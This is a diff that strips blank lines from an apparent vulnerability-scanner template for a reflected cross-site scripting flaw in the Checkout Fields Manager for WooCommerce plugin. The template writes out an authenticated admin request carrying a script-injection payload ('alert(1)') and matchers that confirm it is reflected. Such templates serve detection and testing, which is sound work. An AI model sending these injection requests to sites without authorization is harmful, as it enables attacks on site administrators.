@@ -1,5 +1,4 @@
 id: checkout-fields-manager-xss
-
 info:
   name: Checkout Fields Manager for WooCommerce < 5.5.7 - Reflected Cross-Site Scripting
   author: Akincibor
@@ -11,7 +10,6 @@ info:
   metadata:
     verified: true
   tags: wp-plugin,xss,wp,wordpress,authenticated,woocommerce
-
 requests:
   - raw:
       - |
@@ -25,7 +23,6 @@ requests:
       - |
         GET /wp-admin/admin.php?page=wc-settings&tab=wooccm&section=advanced&">--><script>alert(1)</script> HTTP/1.1
         Host: {{Hostname}}
-
     cookie-reuse: true
     matchers-condition: and
     matchers:
@@ -33,12 +30,10 @@ requests:
         part: body
         words:
           - '>--><script>alert(1)</script>&action=wooccm_nuke_options&'
-
       - type: word
         part: header
         words:
           - text/html
-
       - type: status
         status:
           - 200
